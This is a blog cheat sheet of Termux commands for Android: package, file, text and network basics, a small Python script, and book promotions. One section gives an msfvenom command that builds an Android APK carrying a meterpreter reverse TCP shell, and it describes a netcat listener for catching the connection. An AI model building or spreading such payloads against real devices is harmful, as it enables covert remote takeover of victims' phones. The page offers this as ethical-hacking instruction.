---
URL: https://denizhalil.com/2024/01/02/termux-commands-cheat-sheet/
Author: denizhalil
Site: DenizHalil - Professional Cybersecurity Consulting and Penetration Testing
published: 24.0201
Abstract: Unlock the full potential of Termux with our comprehensive guide.
  Learn essential commands, file management, network tools, and more.
Extracted_On: 25.2009
Web_Title: The Ultimate Guide to Termux Commands
---

![](https://denizhalil.com/wp-content/uploads/2024/01/termux-cheat-sheet.png)

#### **Entrance**

Welcome to this comprehensive guide on Termux, a powerful terminal emulator and Linux environment application for Android devices. This guide is designed to assist users of all levels in navigating the functionalities of Termux, offering a wealth of information on basic commands, file management, network tools, development utilities, and more.

Whether you’re a beginner looking to familiarize yourself with the Linux command line or an experienced developer seeking to exploit the full potential of Termux apk, this handbook provides practical commands and tips for a variety of uses. It also delves into more advanced topics such as creating payloads and viruses for ethical hacking, and performing file operations with Python. This guide is your go-to resource for exploring the versatility and [**power of Termux**](https://denizhalil.com/2023/12/16/termux-android-linux-experience/),

#### **Termux Basic Commands**

- `**pkg update**`: Updates the package list.
- `**pkg upgrade**`: Upgrades installed packages.
- `**pkg install** [package_name]`: Installs a new package (e.g., `pkg install python`).
- `**termux-setup-storage**`: Requests permission for storage access (to access your files).
- `**termux-wake-lock**`: Prevents the device from sleeping while Termux is running.
- `**termux-wake-unlock**`: Releases the wake lock set by `termux-wake-lock`.

#### **File Management**

- `**ls**`: Lists files and directories in the current directory.
- `**cd** [directory_path]`: Changes the directory (e.g., `cd /sdcard`).
- `**mkdir** [directory_name]`: Creates a new directory.
- `**rm** [file_name]`: Deletes a file.
- `**cp** [source] [destination]`: Copies a file from one location to another.
- `**tar** -xzvf [archive_name.tar.gz]`: Extracts a compressed archive.
- `**zip** -r [archive_name.zip] [directory_name]`: Creates a ZIP archive of a directory.
- `**unzip** [archive_name.zip]`: Extracts a ZIP archive.

![Termux Cheat Sheet](https://cdn.buymeacoffee.com/uploads/rewards/2024-01-02/1/082006_termuxcheatsheet.png@1200w_0e.png)

#### **Termux Cheat Sheet**

In our Termux Cheat Sheet book, which has been prepared for you in PDF format, you can learn Linux commands, cyber security, coding, network connections and many more topics.

[-35% $5 on buymeacoffee](https://buymeacoffee.com/halildeniz/e/200220)

#### **Text Editing and Processing**

- `**nano** [file_name]`: Opens the Nano text editor.
- `**cat** [file_name]`: Displays the content of a file.
- `**grep** [word] [file_name]`: Searches for a specific word in a file.
- `**join** [file1] [file2]`: Joins lines of two files on a common field.
- `**less** [file_name]`: Views the content of a file one screen at a time.
- `**more** [file_name]`: An older pager program similar to `less`.

#### **Network Tools**

- `**ping** [website_address]`: Pings a website.
- `**curl** [website_address]`: Retrieves the content of a website.
- `**wget** [file_link]`: Downloads a file from the internet.
- `**ifconfig**`: Configures or displays network interface parameters for a network interface controller.
- `**iptables** -L`: Lists the set of rules used by the iptables firewall.
- `**host** [domain]`: Performs DNS lookups.

#### **Special Packages and Tools**

- `**git**`: Version control system.
- `[](http://localhost:63342/markdownPreview/1087856242/markdown-preview-index-982780784.html?_ijt=o5mi6hs9r0lcs18du20e3crmck#)**python**`: Installs the Python programming language.
- `**ssh**`: Used for secure shell connections.
- `**postgresql**`: Installs PostgreSQL, an advanced open source database system.
- `**nmap**`: Network exploration tool and security/port scanner.
- `**openssh**`: Installs OpenSSH, a suite of secure networking utilities based on the SSH protocol.
- `**r**`: Installs R, a language and environment for statistical computing and graphics.

![Mastering Linux Networking and Security](https://cdn.buymeacoffee.com/uploads/rewards/2024-10-12/1/112106_Blue_Soft_Book_Cover_Mockup_Pinterest_Pin_1.png@1200w_0e.png)

#### **Mastering Linux Networking and Security**

As you progress through this book, you’ll gain the skills necessary to not only manage networks but also protect them from the ever-evolving threats that exist in today’s digital landscape.

[-5% 18 on buymeacoffee](https://buymeacoffee.com/halildeniz/e/315997)

#### **Extended File Management Commands**

- `**touch** [file_name]`: Creates a new empty file.
- `**mv** [source] [destination]`: Moves or renames a file or directory.
- `**find** [directory] -name [search_pattern]`: Searches for files or directories within a specified directory.
- `**diff -r [directory1] [directory2]**`: Compares files in two directories recursively.
- `**tree [directory_name]**`: Displays a tree representation of directory structure.
- `**df -h**`: Shows disk space usage of all mounted filesystems in a human-readable format.
- `**fdisk -l**`: Lists the partition tables for the specified devices and their partitions.

#### **Advanced Text Processing**

- `**sed** 's/[old_string]/[new_string]/g' [file_name]`: Replaces all occurrences of a string in a file.
- `**awk** '/[pattern]/ {action}' [file_name]`: Scans a file line by line and performs actions on lines that match a pattern.
- `**tail** -n [number] [file_name]`: Displays the last few lines of a file.
- `**fold** -w [width] [file_name]`: Wraps each input line to fit in specified width.
- `**tac** [file_name]`: Concatenate and print files in reverse.
- `**sed** -n [pattern]p [file_name]`: Prints only those lines that match the pattern.
- `**awk** 'BEGIN {action}' [file_name]`: Executes an action before reading the lines of a file.

#### **System Information and Management**

- `**top**`: Displays real-time system processes and resource usage.
- `**df**`: Shows disk space usage.
- `**uptime**`: Shows how long the system has been running.
- `**who**`: Shows who is logged on.
- `**w**`: Shows who is logged in and what they are doing.
- `**last**`: Shows a listing of last logged in users.

#### **Networking and Connectivity**

- `**nmap** [ip_address/domain]`: Scans for open ports on a network host.
- `**ssh** [user]@[host]`: Connects to a remote host via SSH.
- `**scp** [source] [user]@[host]:[destination]`: Securely copies files between hosts over SSH.

#### **Package Management and Customization**

- `**pkg list-installed**`: Lists all installed packages.
- `**pkg search [package_name]**`: Searches for a package in the repositories.
- `**termux-change-repo**`: Allows changing the repositories for updating and installing packages.

#### **Development Tools**

- `**git clone** [repository_url]`: Clones a Git repository.
- `[](http://localhost:63342/markdownPreview/1087856242/markdown-preview-index-982780784.html?_ijt=o5mi6hs9r0lcs18du20e3crmck#)**python -m http.server**`: Starts a simple HTTP server in the current directory (useful for testing web pages).
- `**gem install [gem_name]**`: Installs Ruby gems.
- `**make**`: Builds and compiles a project from source code.
- `**gradle** build`: Builds a project using Gradle, often used for Java and Android projects.
- `**vim** [file]`: Edits files using Vim, a powerful text editor.
- `**nano** [file]`: Edits files in Nano, a simpler text editor.

![Programming Symbols Stickers](https://m.media-amazon.com/images/I/715rPdqrvHL._AC_SL1180_.jpg)

## Linux Commands Line Mouse pad

Linux Commands Line Mouse pad – Extended Large Cheat Sheet Mousepad. Shortcuts to Kali/Red Hat/Ubuntu/OpenSUSE/Arch/Debian/Unix Programmer. Non-Slip Gaming Desk mat

[$20.95 on Amazon](https://amzn.to/4blppf8)

#### **Payload and Virus with Termux**

`msfvenom` is a payload generator tool from the Metasploit Framework that is used to create custom payloads for various platforms. Below are examples of how to create payloads using `msfvenom`. Remember, these payloads are for ethical hacking and penetration testing purposes only and should only be used in a legal context, with explicit permission.

##### Android Payload

- **Description**: Create a reverse TCP payload for an Android application.
- **Command**:

```
msfvenom -p android/meterpreter/reverse_tcp LHOST=<Your-IP> LPORT=4444 R > android_payload.apk
```

- **Explanation**: This command generates an Android APK file (`android_payload.apk`) that establishes a reverse TCP connection to the specified IP address (`<Your-IP>`) and port (`4444`).

![Mastering Python for Ethical Hacking: A Comprehensive Guide to Building 50 Hacking Tools](https://cdn.buymeacoffee.com/uploads/rewards/2024-10-07/1/074122_1.png@1200w_0e.png)

#### Mastering Python for Ethical Hacking: A Comprehensive Guide to Building 50 Hacking Tools

Let’s embark on this journey together, where you will learn to use Python not just as a programming language, but as a powerful weapon in the fight against cyber threats

[-5% $25 on buymeacoffee](https://buymeacoffee.com/halildeniz/e/296372)

#### **Setting Up a Listener with `nc` for Metasploit Payloads**

Netcat is a versatile networking tool used for a variety of network tasks, including setting up simple listeners:

- **Listen on a Port**: To set up a listener, use the following command:

- Here, `4444` is the port number. Ensure it matches the port number used in your payload.
- **Wait for Connection**: Once you run this command, Netcat will listen on the specified port for incoming connections. When the target executes the payload (e.g., a reverse shell), you should see the connection on this terminal.

#### **Coding With Termux**

###### **Python: File Operations**

1. **Script Example**:
    - This Python script will create a file, write some text to it, then read and print the content, and finally close the file, [Programming with Python on Termux: From Basics to Advanced](https://denizhalil.com/2024/09/10/python-programming-on-termux/).
    - Save this script as `file_ops.py`.

```
# file_ops.py
def main():
    filename = "testfile.txt"

    # Writing to a file
    with open(filename, 'w') as file:
        file.write("Hello, Termux!")

    # Reading from the file
    with open(filename, 'r') as file:
        content = file.read()
        print(content)

if __name__ == "__main__":
    main()
```

2. **Editing with Nano**:
    - Open Termux and type `nano file_ops.py` to create/edit the file.
    - After pasting or typing the script, press `CTRL+O` then `Enter` to save and `CTRL+X` to exit nano.
3. **Running the Script**:
    - In Termux apk, run the script using `[](http://localhost:63342/markdownPreview/1087856242/markdown-preview-index-982780784.html?_ijt=o5mi6hs9r0lcs18du20e3crmck#)python file_ops.py`.

#### **Shortcuts and Tips**

- Long-press the terminal for additional options like paste, more, and keyboard shortcuts.
- You can use Termux’s API calls for accessing device features like the camera, microphone, etc., by installing the `termux-api` package.
- Customize your Termux environment with `.bashrc` or `.zshrc` for [**bash or zsh**](https://denizhalil.com/2023/09/27/bash-shell-programming-guide/) shells, respectively, to add aliases, functions, and environment variables.

![Mastering Scapy: A Comprehensive Guide to Network Analysis](https://cdn.buymeacoffee.com/uploads/rewards/2024-10-05/1/160929_2.png@1200w_0e.png)

#### Mastering Scapy: A Comprehensive Guide to Network Analysis

Mastering Network Analysis with Scapy” is not just about learning a tool; it’s about unlocking a deeper understanding of the digital world that surrounds us

[-5% $20 on buymeacoffee](https://buymeacoffee.com/halildeniz/e/182908)